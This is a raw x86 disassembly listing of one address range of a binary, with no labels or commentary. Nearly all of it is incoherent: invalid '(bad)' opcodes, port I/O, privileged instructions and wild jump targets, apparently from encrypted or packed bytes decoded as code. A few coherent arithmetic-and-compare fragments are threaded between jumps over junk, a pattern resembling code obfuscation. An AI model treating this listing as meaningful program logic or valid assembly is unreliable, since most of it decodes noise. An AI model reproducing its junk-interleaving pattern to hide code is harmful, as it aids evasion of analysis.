  40b00b:	xlat   BYTE PTR ds:[ebx]
  40b00c:	and    ebx,esp
  40b00e:	cld    
  40b00f:	cmp    DWORD PTR [edx+edx*8+0x19],edx
  40b013:	fist   WORD PTR [edi+ebx*8-0x4d]
  40b017:	mov    ds:0xe4c060d,al
  40b01c:	dec    eax
  40b01d:	fmul   st,st(4)
  40b01f:	js     0x40b010
  40b021:	(bad)  
  40b022:	mov    edi,0xcb0b3c8
  40b027:	push   0xffffff81
  40b029:	add    eax,ebx
  40b02b:	(bad)
  40b02e:	(bad)  
  40b02f:	popa   
  40b030:	dec    esp
  40b031:	push   edx
  40b032:	dec    edi
  40b033:	in     eax,dx
  40b034:	(bad)  
  40b035:	out    dx,eax
  40b036:	call   esp
  40b038:	cwde   
  40b039:	jbe    0x40b08a
  40b03b:	test   al,0xac
  40b03d:	lock sbb al,BYTE PTR [esi+ecx*4+0xa]
  40b042:	xchg   esp,eax
  40b043:	mov    eax,ds:0x7faace7c
  40b048:	stc    
  40b049:	call   0xda2b8558
  40b04e:	mov    dl,0xa2
  40b050:	sbb    edx,edi
  40b052:	push   ebx
  40b053:	stos   DWORD PTR es:[edi],eax
  40b054:	out    dx,al
  40b055:	mov    al,ds:0x1e7a8162
  40b05a:	aad    0xea
  40b05c:	stos   BYTE PTR es:[edi],al
  40b05d:	or     eax,0xaa7f5b8a
  40b062:	cwde   
  40b063:	jne    0x40b0e2
  40b065:	in     al,dx
  40b066:	loop   0x40b076
  40b068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b069:	clc    
  40b06a:	call   0xb91d:0x1fdb5be7
  40b071:	push   ss
  40b072:	push   esi
  40b073:	mov    esi,0xc4f211fe
  40b078:	(bad)  
  40b079:	and    ebp,DWORD PTR [edi+eax*1-0x54]
  40b07d:	clc    
  40b07e:	scas   al,BYTE PTR es:[edi]
  40b07f:	mov    BYTE PTR [ecx-0x325c983f],bl
  40b085:	aam    0xb3
  40b087:	mov    DWORD PTR [eax],eax
  40b089:	mov    ss,WORD PTR [ebx-0x3f317693]
  40b08f:	cld    
  40b090:	xor    DWORD PTR [ebp-0x22d9cfbb],ecx
  40b096:	pop    esp
  40b097:	cdq    
  40b098:	and    BYTE PTR ds:0x3bfd1219,dh
  40b09e:	mov    bl,0x81
  40b0a0:	inc    esp
  40b0a1:	(bad)  
  40b0a2:	leave  
  40b0a3:	punpckhdq mm3,QWORD PTR [ebx+0x14255f38]
  40b0aa:	jmp    0x14f57ae6
  40b0af:	jmp    0x45f4:0xe9a97ead
  40b0b6:	mov    DWORD PTR [edx+edi*8],eax
  40b0b9:	mov    DWORD PTR [edi*4-0x371a5f3c],0x3264bb1a
  40b0c4:	aam    0x1
  40b0c6:	int    0xc5
  40b0c8:	add    ch,BYTE PTR [edx]
  40b0ca:	mov    al,0x89
  40b0cc:	xchg   esp,eax
  40b0cd:	sar    DWORD PTR [ecx],0xe
  40b0d0:	aaa    
  40b0d1:	pop    ecx
  40b0d2:	or     DWORD PTR [esi+0x53fc13ae],ebx
  40b0d8:	mov    WORD PTR [esi+0x2d],fs
  40b0db:	sbb    dl,BYTE PTR [esi]
  40b0dd:	loope  0x40b12c
  40b0df:	sub    al,0xc4
  40b0e1:	inc    ebp
  40b0e2:	es fwait
  40b0e4:	sar    BYTE PTR [ebp+0x4deace1],1
  40b0ea:	fsub   st,st(5)
  40b0ec:	lods   eax,DWORD PTR ds:[esi]
  40b0ed:	pusha  
  40b0ee:	lods   eax,DWORD PTR ds:[esi]
  40b0ef:	mov    edi,0x911abfb3
  40b0f4:	push   esp
  40b0f5:	mov    ebp,edx
  40b0f7:	mov    edx,DWORD PTR [ebx-0x14]
  40b0fa:	nop
  40b0fb:	jmp    FWORD PTR [edx-0x2]
  40b0fe:	pop    edi
  40b0ff:	xor    DWORD PTR [ecx+0x71],ecx
  40b102:	adc    BYTE PTR [ecx-0x31],dl
  40b105:	jo     0x40b16d
  40b107:	out    0x7c,eax
  40b109:	pcmpgtd mm2,QWORD PTR [eax]
  40b10c:	mov    ds:0x8b6005df,al
  40b111:	dec    ebp
  40b112:	call   0x8c38f6a2
  40b117:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40b11d:	int    0x78
  40b11f:	add    BYTE PTR [eax],al
  40b121:	add    BYTE PTR [ebx],al
  40b123:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40b12a:	add    al,0x8
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	xor    BYTE PTR [edi],bh
  40b149:	js     0x40b0fd
  40b14b:	fucomi st,st(0)
  40b14d:	jo     0x40b1bf
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b163
  40b154:	daa    
  40b155:	sub    esp,ebp
  40b157:	or     esi,DWORD PTR [ebx-0x7d]
  40b15a:	fisub  WORD PTR [esi]
  40b15c:	add    ebp,edx
  40b15e:	ins    DWORD PTR es:[edi],dx
  40b15f:	add    eax,0x4b1e724c
  40b164:	mov    WORD PTR ds:0xf65dcd54,ss
  40b16a:	add    DWORD PTR [eax],0xa54cae40
  40b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b171:	push   0x27b1219a
  40b176:	add    esp,DWORD PTR [edi+ebx*1-0x7d]
  40b17a:	inc    edx
  40b17b:	pop    eax
  40b17c:	cmp    eax,DWORD PTR [edi+0x65]
  40b17f:	daa    
  40b180:	sub    edi,DWORD PTR [eax]
  40b182:	aaa    
  40b183:	and    DWORD PTR [ecx+0x2f],0xada9a9dc
  40b18a:	pop    ebx
  40b18b:	aaa    
  40b18c:	(bad)  
  40b18e:	sbb    ebx,DWORD PTR [edi+0x30]
  40b191:	or     DWORD PTR [ebp+0x160805f0],eax
  40b197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b198:	inc    esi
  40b199:	loope  0x40b21a
  40b19b:	popf   
  40b19c:	pop    ss
  40b19d:	xchg   bx,ax
  40b19f:	inc    eax
  40b1a0:	mov    dl,0xc
  40b1a2:	inc    esi
  40b1a3:	pop    esi
  40b1a4:	int    0xac
  40b1a6:	mov    esi,0xb9df8ee9
  40b1ab:	pop    ebp
  40b1ac:	pop    esi
  40b1ad:	out    dx,eax
  40b1ae:	add    eax,0x3c813fe7
  40b1b3:	jmp    0x9a6eed12
  40b1b8:	cs inc edx
  40b1ba:	cmovge edi,DWORD PTR [ebp+eiz*2+0x5e]
  40b1bf:	inc    ebx
  40b1c0:	or     al,0xdd
  40b1c2:	add    esp,esp
  40b1c4:	into   
  40b1c5:	(bad)  
  40b1c6:	dec    ebx
  40b1c7:	ins    BYTE PTR es:[edi],dx
  40b1c8:	push   eax
  40b1c9:	jmp    0xabde7746
  40b1ce:	xchg   ebp,eax
  40b1cf:	(bad)
  40b1d3:	or     esi,ebx
  40b1d5:	jl     0x40b200
  40b1d7:	cs cmp eax,0xe7ea15c9
  40b1dd:	repnz push edi
  40b1df:	pop    esp
  40b1e0:	ret    
  40b1e1:	dec    esp
  40b1e2:	ficomp WORD PTR [edx+0x7d]
  40b1e5:	mov    bh,0xdd
  40b1e7:	outs   dx,DWORD PTR ds:[esi]
  40b1e8:	xchg   DWORD PTR [ebp-0x45255cd1],edx
  40b1ee:	js     0x40b1e6
  40b1f0:	ins    BYTE PTR es:[edi],dx
  40b1f1:	xor    DWORD PTR [ebx+0x17],0x331f2c50
  40b1f8:	push   edx
  40b1f9:	xchg   esp,eax
  40b1fa:	enter  0x3290,0x6a
  40b1fe:	sbb    BYTE PTR [eax],bh
  40b200:	int3   
  40b201:	stos   BYTE PTR es:[edi],al
  40b202:	adc    BYTE PTR ds:0xe0f5ed83,dh
  40b208:	pop    edi
  40b209:	adc    al,BYTE PTR ds:0xc3001f88
  40b20f:	inc    ebx
  40b210:	mov    dl,0xe1
  40b212:	pop    ebp
  40b213:	jp     0x40b1da
  40b215:	push   ebx
  40b216:	and    al,0xfd
  40b218:	jae    0x40b256
  40b21a:	adc    edi,ebp
  40b21c:	fisub  DWORD PTR [ebx]
  40b21e:	mov    dh,0xd0
  40b220:	pop    ecx
  40b221:	jmp    0x4a01699d
  40b226:	mov    DWORD PTR [esi+0x5a],edi
  40b229:	clc    
  40b22a:	out    0xb2,al
  40b22c:	jmp    0x40b281
  40b22e:	idiv   BYTE PTR [ebp+0x23]
  40b231:	push   esi
  40b232:	cmp    BYTE PTR [ecx-0x70],0x6b
  40b236:	mov    esp,0x4086042f
  40b23b:	jne    0x40b1be
  40b23d:	loopne 0x40b233
  40b23f:	fstp   TBYTE PTR [esi+edx*4-0x80]
  40b243:	or     ebx,DWORD PTR [ecx]
  40b245:	push   edx
  40b246:	lahf   
  40b247:	loope  0x40b1cf
  40b249:	std    
  40b24a:	or     cl,dl
  40b24c:	xchg   esi,eax
  40b24d:	pop    edi
  40b24e:	and    ecx,ebp
  40b250:	ss das 
  40b252:	daa    
  40b253:	test   eax,0xda74afa1
  40b258:	mov    edx,0x6b216695
  40b25d:	lods   al,BYTE PTR ds:[esi]
  40b25e:	mov    edi,0x341ab600
  40b263:	fdivr  DWORD PTR [edi-0x5f]
  40b266:	and    DWORD PTR [esi-0x39],ebx
  40b269:	(bad)  
  40b26a:	bnd jle 0x40b2ae
  40b26d:	addr16 pop ss
  40b26f:	lahf   
  40b270:	pop    es
  40b271:	hlt    
  40b272:	addr16 mov eax,0x5a94424b
  40b278:	pop    ebx
  40b279:	not    DWORD PTR [ebp-0xbce948a]
  40b27f:	xor    al,0x59
  40b281:	and    DWORD PTR [ecx-0x4c],0x4dc15c86
  40b288:	sbb    bh,dl
  40b28a:	dec    ebp
  40b28b:	hlt    
  40b28c:	(bad)  
  40b28d:	xor    cl,BYTE PTR [ecx+0x5b]
  40b290:	xchg   ebx,eax
  40b291:	rcr    BYTE PTR [edx-0x6f],0xd1
  40b295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b296:	stos   DWORD PTR es:[edi],eax
  40b297:	ds dec ebx
  40b299:	daa    
  40b29a:	scas   eax,DWORD PTR es:[edi]
  40b29b:	push   ecx
  40b29c:	xor    bl,dl
  40b29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b29f:	cmp    edx,DWORD PTR ds:0x1b9b9c2f
  40b2a5:	sti    
  40b2a6:	loop   0x40b31d
  40b2a8:	mov    edx,0x2e8de13f
  40b2ad:	mov    eax,ds:0x7c947192
  40b2b2:	retf   0xac29
  40b2b5:	(bad)  
  40b2b6:	push   esi
  40b2b7:	bound  ebp,QWORD PTR [eax+0x49a7b781]
  40b2bd:	inc    esp
  40b2be:	repz js 0x40b325
  40b2c1:	lods   eax,DWORD PTR ds:[esi]
  40b2c2:	retf   0x5401
  40b2c5:	sbb    DWORD PTR [ecx],edx
  40b2c7:	pusha  
  40b2c8:	xchg   ebp,eax
  40b2c9:	add    dl,BYTE PTR [esi-0x74]
  40b2cc:	xchg   ebp,eax
  40b2cd:	and    al,0xd6
  40b2cf:	ror    eax,0xbb
  40b2d2:	adc    eax,0x4f8c165b
  40b2d7:	mov    bh,0x72
  40b2d9:	call   0x877d:0x24e2b5cf
  40b2e0:	xchg   BYTE PTR [ebx],al
  40b2e2:	push   esi
  40b2e3:	mov    eax,0xb4c70768
  40b2e8:	into   
  40b2e9:	push   ds
  40b2ea:	int3   
  40b2eb:	mov    esi,0x4589c1b5
  40b2f0:	fsub   st(1),st
  40b2f2:	mov    bl,0x1
  40b2f4:	add    BYTE PTR [eax],al
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0x76dbadc9
  40b303:	add    dh,bh
  40b305:	scas   eax,DWORD PTR es:[edi]
  40b306:	jo     0x40b2fe
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b2c0
  40b30f:	outs   dx,BYTE PTR ds:[esi]
  40b310:	(bad)  
  40b311:	les    ebx,FWORD PTR [ebx+0x34]
  40b314:	daa    
  40b315:	dec    esp
  40b316:	scas   eax,DWORD PTR es:[edi]
  40b317:	pop    es
  40b318:	lds    ecx,FWORD PTR [edx+0x6a]
  40b31b:	es test eax,0xf8e31244
  40b321:	adc    BYTE PTR [esi+0x7530e687],bh
  40b327:	stos   BYTE PTR es:[edi],al
  40b328:	ror    DWORD PTR [ecx-0x47],cl
  40b32b:	icebp  
  40b32c:	jg     0x40b2ec
  40b32e:	in     eax,0x29
  40b330:	out    dx,al
  40b331:	cli    
  40b332:	pop    es
  40b333:	mov    edi,0xb14e277e
  40b338:	(bad)  
  40b339:	out    0x93,al
  40b33b:	mov    ebx,0x547dd31b
  40b340:	inc    esi
  40b341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b342:	push   ebp
  40b343:	std    
  40b344:	dec    esp
  40b345:	sbb    al,0x63
  40b347:	sbb    esp,eax
  40b349:	xlat   BYTE PTR ds:[ebx]
  40b34a:	adc    al,0x4e
  40b34c:	jg     0x40b333
  40b34e:	aaa    
  40b34f:	add    eax,0x536d60f
  40b354:	cmp    DWORD PTR [edi-0x66539d31],ebx
  40b35a:	mov    bl,0xfc
  40b35c:	xchg   esi,eax
  40b35d:	(bad)  
  40b35f:	ror    BYTE PTR [ebp+0x57],0x1
  40b363:	aaa    
  40b364:	mov    ah,0xe5
  40b366:	loope  0x40b3ca
  40b368:	outs   dx,BYTE PTR cs:[esi]
  40b36a:	push   edx
  40b36b:	mov    ecx,0x822f2791
  40b370:	pop    ds
  40b371:	mov    cl,BYTE PTR [eax+0x2bd5d054]
  40b377:	xchg   edi,eax
  40b378:	jne    0x40b2ff
  40b37a:	cmc    
  40b37b:	cmp    BYTE PTR [edi],dh
  40b37d:	push   edx
  40b37e:	cmp    BYTE PTR [esp+ebx*8],ch
  40b381:	fdiv   DWORD PTR [ecx*2+0x176ae875]
  40b388:	jne    0x40b408
  40b38a:	inc    eax
  40b38b:	sbb    ch,ah
  40b38d:	lahf   
  40b38e:	mov    bl,BYTE PTR [edi+0x2]
  40b391:	cld    
  40b392:	cmp    ah,BYTE PTR [edi-0x6b242e3a]
  40b398:	sti    
  40b399:	fmul   DWORD PTR [edx+0x4b07d239]
  40b39f:	dec    ecx
  40b3a0:	add    DWORD PTR [edx],esi
  40b3a2:	aam    0xfd
  40b3a4:	adc    DWORD PTR [edx+0x853080b],esi
  40b3aa:	push   ss
  40b3ab:	(bad)  
  40b3ad:	add    edx,DWORD PTR [edi-0x592a689f]
  40b3b3:	mov    bl,BYTE PTR [edi]
  40b3b5:	mov    WORD PTR [ebp+eiz*4+0x1273fb39],?
  40b3bc:	cs loope 0x40b431
  40b3bf:	enter  0xa310,0xb0
  40b3c3:	pop    ebx
  40b3c4:	cli    
  40b3c5:	(bad)  [ebp+0x5c7e5657]
  40b3cb:	mov    edi,0x451a8198
  40b3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3d1:	sbb    DWORD PTR [edx+0x57],ecx
  40b3d4:	je     0x40b3c1
  40b3d6:	sub    BYTE PTR [eax],al
  40b3d8:	test   BYTE PTR [eax],0xff
  40b3db:	imul   edi,DWORD PTR [edx+0x4883d2b0],0x52
  40b3e2:	stc    
  40b3e3:	or     eax,DWORD PTR [esi+0x3e26a724]
  40b3e9:	pop    ds
  40b3ea:	in     al,0xb3
  40b3ec:	test   DWORD PTR [esi+0x60],edx
  40b3ef:	push   ebx
  40b3f0:	jne    0x40b38e
  40b3f2:	push   ss
  40b3f3:	sub    al,0x3b
  40b3f5:	test   al,0xc6
  40b3f7:	add    ebx,DWORD PTR [ecx]
  40b3f9:	sar    BYTE PTR ds:[edi+edx*4+0x340c0a7a],cl
  40b401:	scas   eax,DWORD PTR es:[edi]
  40b402:	jmp    0x40b409
  40b404:	mov    ebp,0x3683b354
  40b409:	(bad)  [ecx]
  40b40b:	idiv   edx
  40b40d:	mov    edi,0x12cc98f4
  40b412:	(bad)  
  40b413:	mov    eax,0xb4d6af34
  40b418:	jnp    0x40b45e
  40b41a:	int    0x6a
  40b41c:	sbb    al,0xdd
  40b41e:	pop    ebp
  40b41f:	pop    es
  40b420:	cli    
  40b421:	and    al,BYTE PTR [esi]
  40b423:	mov    eax,ds:0x6a4de6fd
  40b428:	jnp    0x40b461
  40b42a:	ret    0xee8
  40b42d:	loope  0x40b406
  40b42f:	les    ebx,FWORD PTR [ebx-0x56]
  40b432:	jmp    FWORD PTR [eax-0x616d46fe]
  40b438:	call   0x7429545b
  40b43d:	das    
  40b43e:	fnstenv [edi+ebx*1-0x77]
  40b442:	fisubr WORD PTR [eax-0x239c54a9]
  40b448:	push   es
  40b449:	fidivr WORD PTR [ebx]
  40b44b:	test   BYTE PTR [edx],cl
  40b44d:	sbb    DWORD PTR [ebx-0x5d334686],0x62a8f10f
  40b457:	xor    al,0x86
  40b459:	retf   
  40b45a:	rol    BYTE PTR [eax],cl
  40b45c:	addr16 (bad) 
  40b45e:	fstp   QWORD PTR [eax-0x33]
  40b461:	in     eax,dx
  40b462:	mov    al,0x16
  40b464:	mov    ebp,0x332f7c3b
  40b469:	dec    ebp
  40b46a:	lahf   
  40b46b:	dec    DWORD PTR [esi-0x38503b67]
  40b471:	mov    edx,0x697d51fe
  40b476:	cld    
  40b477:	add    DWORD PTR [eax-0x76],edi
  40b47a:	mov    al,ds:0xae2f7ebe
  40b47f:	test   al,0x30
  40b481:	out    dx,al
  40b482:	mov    ds:0x82567ddd,eax
  40b487:	ins    DWORD PTR es:[edi],dx
  40b488:	mov    cl,0x53
  40b48a:	inc    esp
  40b48b:	cwde   
  40b48c:	inc    esp
  40b48d:	jae    0x40b501
  40b48f:	retf   
  40b490:	adc    esi,DWORD PTR [ecx+0x7b]
  40b493:	and    DWORD PTR [ecx+0x64ee432e],esp
  40b499:	ss (bad) 
  40b49b:	es hlt 
  40b49d:	ds leave 
  40b49f:	adc    ch,BYTE PTR ds:0x712c028
  40b4a5:	enter  0x3df1,0x1c
  40b4a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b4ac:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4af:	xor    eax,esi
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0xe413075
  40b4de:	and    esp,DWORD PTR [esi+0x70f59538]
  40b4e4:	jo     0x40b47b
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4d6
  40b4ea:	std    
  40b4eb:	mov    eax,DWORD PTR [edi]
  40b4ed:	sub    eax,0x10cc6f6
  40b4f2:	jecxz  0x40b567
  40b4f4:	cmp    eax,0x1818357d
  40b4f9:	xchg   esi,eax
  40b4fa:	xchg   esp,eax
  40b4fb:	je     0x40b56b
  40b4fd:	cmp    BYTE PTR ds:0xf9b97669,dh
  40b503:	int    0xe6
  40b505:	pop    ebx
  40b506:	xor    edi,edi
  40b508:	ins    BYTE PTR es:[edi],dx
  40b509:	push   eax
  40b50a:	test   DWORD PTR [ebx+0x5e3f4447],edi
  40b510:	loopne 0x40b4df
  40b512:	sbb    BYTE PTR [ebp+eiz*1+0x2d],bl
  40b516:	call   0xcab03715
  40b51b:	das    
  40b51c:	xor    eax,0x97499749
  40b521:	xor    DWORD PTR [edx-0x24a33619],ebp
  40b527:	mov    ch,0xa4
  40b529:	mov    ebp,esi
  40b52b:	in     al,0xc3
  40b52d:	loop   0x40b562
  40b52f:	vmovmskps esp,xmm3
  40b533:	fwait
  40b534:	push   ds
  40b535:	sar    BYTE PTR [eax-0x2b81958a],0xd
  40b53c:	clc    
  40b53d:	sbb    DWORD PTR [ebx-0x37],esi
  40b540:	not    eax
  40b542:	mov    BYTE PTR [ecx],dh
  40b544:	js     0x40b543
  40b546:	dec    ebp
  40b547:	push   cs
  40b548:	inc    ecx
  40b549:	mov    ah,0x67
  40b54b:	cmc    
  40b54c:	fcmovb st,st(6)
  40b54e:	in     al,0x88
  40b550:	mov    ss,WORD PTR [edi-0x529fa828]
  40b556:	cmp    ch,BYTE PTR [ecx+0x726be51c]
  40b55c:	push   0x296e4032
  40b561:	mov    eax,ds:0x30b0bbe1
  40b566:	and    edx,DWORD PTR [eax-0x1db9a0]
  40b56c:	out    dx,al
  40b56d:	fnstenv [ebp-0x41]
  40b570:	scas   al,BYTE PTR es:[edi]
  40b571:	xchg   esi,eax
  40b572:	sahf   
  40b573:	std    
  40b574:	pmaxub mm7,QWORD PTR [eax+edx*4-0x43fc23a1]
  40b57c:	and    BYTE PTR [ebx],al
  40b57e:	(bad)  
  40b57f:	cmp    dh,dh
  40b581:	das    
  40b582:	ss inc esi
  40b584:	pop    edx
  40b585:	rol    DWORD PTR ds:0x306a72e,cl
  40b58b:	sub    dl,cl
  40b58d:	sub    ch,BYTE PTR [edx]
  40b58f:	jmp    0x91d53ded
  40b594:	shr    BYTE PTR [ecx-0x31],0xff
  40b598:	mov    dh,0x4c
  40b59a:	or     ch,BYTE PTR [ecx-0x32]
  40b59d:	call   0xf1e971fb
  40b5a2:	mov    BYTE PTR [ebp-0x6c99e6a9],cl
  40b5a8:	add    BYTE PTR [edi+0x19],al
  40b5ab:	sbb    DWORD PTR [ebx],esi
  40b5ad:	into   
  40b5ae:	call   0x7d278964
  40b5b3:	lods   al,BYTE PTR ds:[esi]
  40b5b4:	mov    ds:0xbe1edc83,eax
  40b5b9:	pop    ebx
  40b5ba:	mov    WORD PTR [eax-0x21],cs
  40b5bd:	daa    
  40b5be:	leave  
  40b5bf:	dec    esi
  40b5c0:	mov    ch,al
  40b5c2:	push   ds
  40b5c3:	jno    0x40b571
  40b5c5:	es mov edx,0x7892068c
  40b5cb:	das    
  40b5cc:	fnstsw WORD PTR [esi-0x5a]
  40b5cf:	cwde   
  40b5d0:	inc    edi
  40b5d1:	scas   al,BYTE PTR es:[edi]
  40b5d2:	adc    eax,0x11327e72
  40b5d7:	dec    BYTE PTR [edi+0x67]
  40b5da:	inc    edi
  40b5db:	dec    ebx
  40b5dc:	push   edx
  40b5dd:	scas   eax,DWORD PTR es:[edi]
  40b5de:	aam    0x5
  40b5e0:	pop    edx
  40b5e1:	out    dx,al
  40b5e2:	es ins DWORD PTR es:[edi],dx
  40b5e4:	jle    0x40b611
  40b5e6:	pop    ds
  40b5e7:	out    dx,eax
  40b5e8:	fdiv   QWORD PTR [ebp-0x29]
  40b5eb:	and    BYTE PTR ds:0xfc0cb2c2,ah
  40b5f1:	fmul   DWORD PTR [ebp+0x61102228]
  40b5f7:	out    0x26,al
  40b5f9:	call   0x55a4:0x44663221
  40b600:	xchg   ebp,eax
  40b601:	pop    eax
  40b602:	mov    WORD PTR [ebp+0x4152a80],cs
  40b608:	pop    esi
  40b609:	je     0x40b5b9
  40b60b:	ins    DWORD PTR es:[edi],dx
  40b60c:	lahf   
  40b60d:	adc    eax,0x6e146662
  40b612:	adc    BYTE PTR [eax],ch
  40b614:	out    dx,eax
  40b615:	adc    dl,ch
  40b617:	sahf   
  40b618:	leave  
  40b619:	cs push cs
  40b61b:	push   ss
  40b61c:	loop   0x40b612
  40b61e:	ret    0xb493
  40b621:	fisubr WORD PTR [ebp+0x36]
  40b624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b625:	or     DWORD PTR ds:0x8bede425,ecx
  40b62b:	cli    
  40b62c:	out    dx,eax
  40b62d:	lock inc edi
  40b62f:	push   ebp
  40b630:	mov    bl,0x44
  40b632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b633:	(bad)  
  40b635:	icebp  
  40b636:	lahf   
  40b637:	mov    al,0xfa
  40b639:	imul   eax,DWORD PTR [esi-0x35],0xffffffda
  40b63d:	pop    ds
  40b63e:	pop    ds
  40b63f:	enter  0xacaf,0x4b
  40b643:	sub    ah,BYTE PTR [edi]
  40b645:	lods   eax,DWORD PTR ds:[esi]
  40b646:	mov    esp,0xbc3b89a1
  40b64b:	add    ch,bh
  40b64d:	enter  0xdd6b,0x81
  40b651:	mov    WORD PTR [esi],?
  40b653:	ss jno 0x40b60a
  40b656:	retf   
  40b657:	or     BYTE PTR [ebx-0x407284fa],ch
  40b65d:	xchg   edi,eax
  40b65e:	scas   al,BYTE PTR es:[edi]
  40b65f:	xor    edx,DWORD PTR [eax]
  40b661:	mov    WORD PTR [ecx],?
  40b663:	jecxz  0x40b6bc
  40b665:	(bad)  
  40b666:	mov    eax,ds:0xdcff86ee
  40b66b:	aad    0x4e
  40b66d:	ficom  DWORD PTR [eax]
  40b66f:	loopne 0x40b6ce
  40b671:	push   cs
  40b672:	push   ds
  40b673:	mov    al,0x6a
  40b676:	(bad)  
  40b677:	out    0xd2,eax
  40b679:	sub    eax,0xb306d278
  40b67e:	xchg   BYTE PTR [edx-0x1a],dh
  40b681:	push   0xffffff9d
  40b683:	inc    esi
  40b684:	mov    eax,DWORD PTR [eax+0xc]
  40b687:	mov    ecx,DWORD PTR [ecx]
  40b689:	jmp    0x40b841
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    ebp,DWORD PTR [edx+0x2a13f979]
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b631
  40b6a7:	push   es
  40b6a8:	xor    BYTE PTR [ecx-0x43],al
  40b6ab:	repz bound ecx,QWORD PTR [esi]
  40b6ae:	ficom  WORD PTR [eax+edx*8-0x633320b5]
  40b6b5:	or     eax,0x60de9475
  40b6ba:	out    0x47,eax
  40b6bc:	adc    esp,DWORD PTR [ebp+0x6]
  40b6bf:	inc    esi
  40b6c0:	mov    bh,0x9c
  40b6c2:	lock ror DWORD PTR [eax+eax*8-0x10],cl
  40b6c7:	jl     0x40b714
  40b6c9:	inc    esp
  40b6ca:	addr16 pop edx
  40b6cc:	jo     0x40b6b2
  40b6ce:	add    DWORD PTR [esi],esp
  40b6d0:	or     BYTE PTR [ebx-0xa],ch
  40b6d3:	pop    ss
  40b6d4:	jnp    0x40b681
  40b6d6:	xor    BYTE PTR [edi+0x28ec7571],al
  40b6dc:	mov    bh,0x1e
  40b6de:	pop    es
  40b6df:	into   
  40b6e0:	jo     0x40b6fe
  40b6e2:	pop    ebp
  40b6e3:	adc    eax,0xbc809a00
  40b6e8:	jle    0x40b73f
  40b6ea:	stos   DWORD PTR es:[edi],eax
  40b6eb:	sahf   
  40b6ec:	xor    ah,BYTE PTR [ebp-0x40647c81]
  40b6f2:	hlt    
  40b6f3:	or     bh,BYTE PTR [ecx-0x66]
  40b6f6:	and    ebp,ebx
  40b6f8:	fwait
  40b6f9:	lds    ecx,FWORD PTR [edx-0x71c94e4d]
  40b6ff:	dec    ebx
  40b700:	pop    ebx
  40b701:	and    al,0x7c
  40b703:	pop    es
  40b704:	or     dl,BYTE PTR [edx-0x58]
  40b707:	adc    eax,0xd1287861
  40b70c:	pop    esp
  40b70d:	inc    ebp
  40b70e:	mov    ebp,0x3d67f0b6
  40b713:	mov    ebx,0x5f60771d
  40b718:	jo     0x40b773
  40b71a:	mov    BYTE PTR ds:0xa29858e,ah
  40b720:	mov    ebp,0xa4429d55
  40b725:	pop    edi
  40b726:	(bad)  
  40b727:	and    eax,0x7ca6ce58
  40b72c:	jmp    0x40b798
  40b72e:	aas    
  40b72f:	lods   al,BYTE PTR ds:[esi]
  40b730:	test   edi,ebp
  40b732:	pop    es
  40b733:	xlat   BYTE PTR ds:[ebx]
  40b734:	sub    DWORD PTR [ecx-0x7f],ebp
  40b737:	xlat   BYTE PTR ds:[ebx]
  40b738:	pop    edi
  40b739:	fprem1 
  40b73b:	mov    esp,0xbba94a51
  40b740:	data16 sub al,0xf5
  40b743:	mov    eax,ds:0x109eca3c
  40b748:	or     eax,0x3758fd8d
  40b74d:	(bad)  
  40b74e:	mov    ds:0x414b511d,al
  40b753:	in     eax,dx
  40b754:	arpl   WORD PTR [ebx-0x4639461f],dx
  40b75a:	mov    DWORD PTR ds:0x6e76c94,ebp
  40b760:	sub    al,0xde
  40b762:	cdq    
  40b763:	and    eax,0xf6535a9f
  40b768:	dec    eax
  40b769:	mov    dl,0xa3
  40b76b:	adc    esi,edi
  40b76d:	in     eax,dx
  40b76e:	dec    ebp
  40b76f:	xlat   BYTE PTR ds:[ebx]
  40b770:	cwde   
  40b771:	cmp    al,0x39
  40b773:	pushf  
  40b774:	hlt    
  40b775:	and    bh,ah
  40b777:	in     al,dx
  40b778:	test   BYTE PTR [ecx+0xc16cf4],dh
  40b77e:	add    dh,BYTE PTR [eax-0x45e06836]
  40b784:	dec    edx
